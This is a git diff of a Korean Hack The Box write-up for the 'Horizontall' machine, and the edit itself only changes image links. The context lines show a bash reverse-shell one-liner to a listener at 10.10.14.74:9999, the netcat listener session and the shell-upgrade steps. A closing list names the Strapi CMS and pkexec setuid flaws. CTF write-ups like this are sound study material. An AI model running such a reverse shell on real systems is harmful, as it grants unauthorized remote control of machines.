@@ -141,7 +141,7 @@ RCE exploit은 성공했으나 blind RCE라서 값이 출력은 되지않음
 셸을 얻기 위해 리버스셸 코드 실행
 
 bash -c 'exec bash -i &>/dev/tcp/10.10.14.74/9999 <&1'
-![alt text](image-4.png)
+![revshell](img/revshell.png)
 
 
 ```bash
@@ -149,8 +149,7 @@ bash -c 'exec bash -i &>/dev/tcp/10.10.14.74/9999 <&1'
 strapi@horizontall:~/myapi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 strapi@horizontall:~/myapi$ ^Z
-zsh: suspended  nc -nlvp 9999
-![revshell](img/revshell.png)                                                                                                                                             
+zsh: suspended  nc -nlvp 9999                                                                                                                                           
 ┌──(root㉿kali)-[~/Hack_The_Box/Horizontall]
 └─# stty raw -echo;fg   
 [1]  + continued  nc -nlvp 9999
@@ -196,4 +195,5 @@ e7931bd6e9f0a01d00e008d5cdd5e005
 # 취약점
 - 취약한 버전의 Strapi CMS 3.0.0-beta.17.4 사용
 - 잘못된 setuid 설정 /usr/bin/pkexec 권한상승 취약점이 존재하는 바이너리 파일이 setuid설정 되어있음음
+
 
